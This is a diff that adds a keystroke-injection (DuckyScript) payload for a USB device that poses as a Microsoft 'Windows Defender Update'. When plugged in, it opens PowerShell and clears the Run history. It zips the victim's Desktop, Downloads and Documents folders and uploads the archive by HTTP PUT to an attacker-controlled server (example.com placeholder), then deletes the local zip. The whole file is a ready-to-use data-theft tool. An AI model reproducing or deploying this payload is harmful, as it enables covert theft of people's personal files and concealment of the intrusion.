@@ -1,0 +1,40 @@
+REM | Win-Exfiltrate_Personal-HTTP
+REM |
+REM | This script
+REM |
+REM |
+REM |
+REM | Written by JeffTadashi
+REM | https://github.com/JeffTadashi/omducky/
+REM |
+VID 045E
+PID 0048
+MAN Microsoft
+PRO Windows Defender Update
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+REM | Command below erases the "Run" history. This is optional.
+STRING rp -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
+ENTER
+DELAY 2000
+REM | Collect downloads/desktop/documents folders into a zip
+STRING Compress-Archive -U -Path ~\Desktop\*,~\Downloads\*,~\Documents\* -DestinationPath .\temp.zip
+ENTER
+DELAY 3000
+REM | Generate random filename base for uploading later
+STRING $r=[System.IO.Path]::GetRandomFileName()
+ENTER
+REM | Upload via HTTP PUT method. Requires a public webserver with PUT capabilities.
+REM | Here is an example python HTTP server: https://gist.github.com/fabiand/5628006
+REM ~~ | Change "example.com" with public IP or domain-name of your HTTP server with PUT capabilities.
+STRING Invoke-Restmethod -Uri http://example.com/$r.zip -Method Put -Infile .\temp.zip
+ENTER
+DELAY 2000
+REM | File cleanup and exit...
+STRING rm .\temp.zip
+ENTER
+STRING exit
+ENTER
